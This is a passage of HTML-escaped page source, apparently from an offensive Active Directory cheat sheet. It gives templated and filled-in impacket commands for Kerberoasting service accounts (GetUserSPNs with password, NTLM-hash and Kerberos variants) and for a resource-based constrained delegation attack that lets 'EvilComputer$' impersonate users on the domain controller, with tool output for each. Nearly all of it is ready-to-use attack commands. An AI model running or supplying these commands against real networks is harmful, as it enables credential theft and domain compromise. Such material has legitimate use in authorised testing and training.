class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;------------------------  ---------------  --------  --------------------------  --------------------------  ----------   &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4-rbcd-attack-control-over-an-account-with-spn&#34;&gt;4. RBCD Attack [Control over an Account with SPN]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-rbcd &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -delegate-from &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer$&amp;#39;&lt;/span&gt; -delegate-to &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC$&amp;#39;&lt;/span&gt; -action &lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Delegation rights modified successfully!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Accounts allowed to act on behalf of other identity:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -delegate-from &amp;#39;&amp;lt;COMPUTER&amp;gt;$&amp;#39; -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -action &amp;#39;write&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span 